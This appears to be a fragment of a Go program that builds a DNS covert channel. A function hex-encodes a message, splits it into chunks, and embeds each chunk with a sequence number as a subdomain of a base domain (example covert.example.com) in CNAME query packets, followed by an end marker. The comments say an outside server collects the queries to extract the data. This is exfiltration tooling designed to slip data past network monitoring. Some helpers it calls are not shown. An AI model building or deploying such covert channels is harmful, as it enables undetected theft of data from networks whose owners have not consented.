package main

import (
	"encoding/hex"
	"fmt"

	"github.com/google/gopacket/layers"
)

// generateCovertCNAMEQueries generates covert DNS CNAME queries where data is
// embedded in the queried domain name itself.
// The server side would need to monitor incoming CNAME queries to extract data.
func generateCovertCNAMEQueries(message string) ([][]byte, error) {
	// --- Covert Channel Logic ---
	covertData := []byte(message)
	// Using Hex encoding. Consider Base32/Base36 for more "hostname-like" labels,
	// but requires custom encoding/decoding and handles padding differently.
	encodedData := hex.EncodeToString(covertData)

	// Domain labels have a max length of 63 chars. Hex encoding doubles the size.
	// Keep chunk size well below 63 to be safe and allow for sequence numbers etc.
	const encodedChunkSize = 60
	sequenceNumber := 0
	dnsQueryPackets := make([][]byte, 0)

	fmt.Printf("Encoding message: '%s'\n", message)
	fmt.Printf("Hex encoded: %s\n", encodedData)
	fmt.Printf("Using base domain: %s\n", BASE_DOMAIN)

	for i := 0; i < len(encodedData); i += encodedChunkSize {
		end := i + encodedChunkSize
		if end > len(encodedData) {
			end = len(encodedData)
		}
		chunk := encodedData[i:end]

		// Construct the full domain name for the query
		// Format: [hex_chunk].[sequence_number].[base_domain]
		// Example: 68656c6c6f.0.covert.example.com
		queryDomain := fmt.Sprintf("%s.%d.%s", chunk, sequenceNumber, BASE_DOMAIN)

		fmt.Printf("  Chunk %d: %s\n", sequenceNumber, chunk)
		fmt.Printf("  Query Domain: %s\n", queryDomain)

		// Generate the DNS CNAME query packet
		// Note: We are sending a *query* of type CNAME for the constructed domain.
		dnsQueryPacket, _ := generateDNSQuery(queryDomain, layers.DNSTypeCNAME)

		dnsQueryPackets = append(dnsQueryPackets, dnsQueryPacket)
		sequenceNumber++
	}

	// Generate an end marker query
	endQueryDomain := fmt.Sprintf("end.%d.%s", sequenceNumber, BASE_DOMAIN)
	fmt.Printf("  End Marker Query Domain: %s\n", endQueryDomain)
	endQueryPacket, _ := generateDNSQuery(endQueryDomain, layers.DNSTypeCNAME)
	dnsQueryPackets = append(dnsQueryPackets, endQueryPacket)

	fmt.Printf("Generated %d CNAME query packets.\n", len(dnsQueryPackets))

	return dnsQueryPackets, nil
}
